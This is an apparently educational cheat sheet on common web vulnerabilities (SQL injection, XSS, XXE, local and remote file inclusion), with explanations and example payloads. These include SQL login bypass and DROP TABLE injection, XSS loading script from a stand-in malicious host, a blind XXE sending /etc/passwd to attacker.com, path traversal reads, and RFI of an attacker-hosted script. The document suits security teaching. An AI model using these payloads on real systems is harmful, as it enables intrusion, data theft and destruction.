
# OWASP TOP 10

## SQLI

- SQL Injection (SQLI) is an attack technique used to exploit vulnerabilities in web applications 
that do not properly validate user input in SQL queries sent to the database. Attackers can use this 
technique to execute malicious SQL queries and obtain sensitive information, such as usernames, passwords, 
and other data stored in the database.

- Types of SQL Injection:
    - Error-based: Exploits SQL code errors to gather information.
    - Time-based: Uses time-delayed queries to extract data.
    - Boolean-based: Employs boolean expressions to obtain additional information.
    - Union-based: Combines two or more queries using the "UNION" clause.
    - Stacked queries: Executes multiple queries in a single statement.

### Examples of SQL Injection exploitation:

#### Authentication bypass:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
```

This query always returns true, potentially granting unauthorized access.

#### Data extraction:
```sql
SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admin_users
```
This query combines results from two tables, potentially exposing admin credentials.

#### Time-based blind injection:
```sql
SELECT * FROM users WHERE id = 1 AND IF(SUBSTRING(username,1,1) = 'a', SLEEP(5), 0)
```
If the first character of the username is 'a', the query will delay for 5 seconds, allowing data extraction 
through timing analysis.

#### Inserting malicious data:
```sql
INSERT INTO users (username, email) VALUES ('hacker', 'malicious@email.com'); DROP TABLE users;--')
```
This query inserts a new user and then drops the entire users table.

## XSS

- Cross-Site Scripting (XSS) vulnerability is a type of computer security vulnerability that allows an 
attacker to execute malicious code on a user's web page without their knowledge or consent. 

- This vulnerability enables the attacker to steal personal information, such as usernames, passwords, 
and other confidential data.

- Essentially, an XSS attack involves inserting malicious code into a vulnerable web page, which is then 
executed in the browser of the user accessing that page. The malicious code can be anything from scripts 
that redirect the user to another page to scripts that log keystrokes or form data and send them to a remote server.

There are several types of XSS vulnerabilities, including:
### Reflected XSS: 
This type of XSS occurs when user-provided data is reflected in the HTTP response without proper validation. 
This allows an attacker to inject malicious code into the response, which is then executed in the user's browser.

#### Example of Reflected XSS:

```xml
<% String eid = request.getParameter("eid"); %>
...
Employee ID: <%= eid %>

```
In this example, if an attacker sets the "eid" parameter to `<script>alert('XSS')</script>`, it will execute in the victim's browser

### Stored XSS: 
This type of XSS occurs when an attacker is able to store malicious code in a database or on the web server hosting a vulnerable web page. 
This code is executed every time the page is loaded.

#### Example of Stored XSS:

```xml
<p>I highly recommend this product!</p>
<script src="http://malicious.com/exploit.js"> </script>
```
In this case, the malicious script is stored in the comment section of a retail website and will be executed every time a user views the page

### DOM-Based XSS:

This type of XSS occurs when malicious code is executed in the user's browser through the Document Object Model (DOM). 
This happens when JavaScript code on a web page modifies the DOM in a way that is vulnerable to malicious code injection.

#### Example of DOM-Based XSS:

```JavaScript
var name = document.location.hash.substr(1);
document.write("Hello, " + name);
```

If the URL ends with `#<script>alert('XSS')</script>`, the script will be executed.

## XXE

- When we talk about XML External Entity (XXE) Injection, we're referring to a security vulnerability where an attacker 
can use malicious XML input to access system resources that would normally be unavailable, such as local files or network services. 
This vulnerability can be exploited in applications that use XML to process inputs, such as web applications or web services.
An XXE attack typically involves injecting a malicious XML entity into an HTTP request, 
which is processed by the server and can result in the exposure of sensitive information. For example, an attacker could inject 
an XML entity that references a file on the server's system and obtain confidential information from that file.

- An XXE attack typically involves injecting a malicious XML entity into an HTTP request, which is processed by the server and can result 
in the exposure of sensitive information. For example, an attacker could inject an XML entity that references a file on the server's system 
and obtain confidential information from that file.

- Here are some examples of XXE attacks

### File Disclosure:

```xml
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

This example attempts to read the contents of the /etc/passwd file on a Unix-based system.

### Blind XXE:

```xml
<!DOCTYPE data SYSTEM "http://attacker.com/evil.dtd">
<data>&send;</data>
```

With evil.dtd containing:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;
```

This example demonstrates a blind XXE attack where the content of /etc/passwd is sent to the attacker's server

## Local File Inclusion (LFI)

The Local File Inclusion (LFI) vulnerability is a computer security vulnerability that occurs when a web 
application does not properly validate user inputs, allowing an attacker to access local files on the web server.

In many cases, attackers exploit the LFI vulnerability by abusing input parameters in the web application. 
Input parameters are data that users enter into the web application, such as URLs or form fields. 
Attackers can manipulate input parameters to include local file paths in the request, 
which can allow them to access files on the web server. This technique is known as "Path Traversal" 
and is commonly used in LFI attacks.

In a Path Traversal attack, the attacker uses special characters and escape characters 
in the input parameters to navigate through the web server's directories and access files in sensitive system 
locations.

For example, the attacker could include "../" in the input parameter to navigate up the directory structure 
and access files in sensitive system locations.

### Basic LFI

```ruby
http://vulnerable-site.com/index.php?page=../../../etc/passwd
```
This example attempts to access the /etc/passwd file on a Unix-based system.

### Null byte injection:
```ruby
http://vulnerable-site.com/index.php?page=../../../etc/passwd%00
```
This technique can be used to bypass certain types of input validation

### PHP wrapper

```ruby
http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
This example uses a PHP wrapper to read and encode the contents of a PHP file.

## Remote File Inclusion (RFI)
- The Remote File Inclusion (RFI) vulnerability is a security flaw where an attacker can include remote 
files in a vulnerable web application. 
This can allow the attacker to execute malicious code on the web server and compromise the system.

- In an RFI attack, the attacker uses user input, such as a URL or form field, to include a remote file 
in the request. If the web application does not properly validate these inputs, it will process the 
request and return the content of the remote file to the attacker.

- An attacker can exploit this vulnerability to include malicious remote files containing harmful code, 
such as viruses or trojans, or to execute commands on the vulnerable server. In some cases, the attacker 
can direct the request to a PHP resource hosted on their own server, giving them a higher degree of control 
in the attack.

## Basic RFI attack:

```ruby
http://vulnerable-site.com/index.php?page=http://attacker-site.com/malicious-script.php
```

### RFI with PHP wrapper:
```ruby
http://vulnerable-site.com/index.php?page=php://filter/convert.base64-encode/resource=http://attacker-site.com/malicious-script.php
```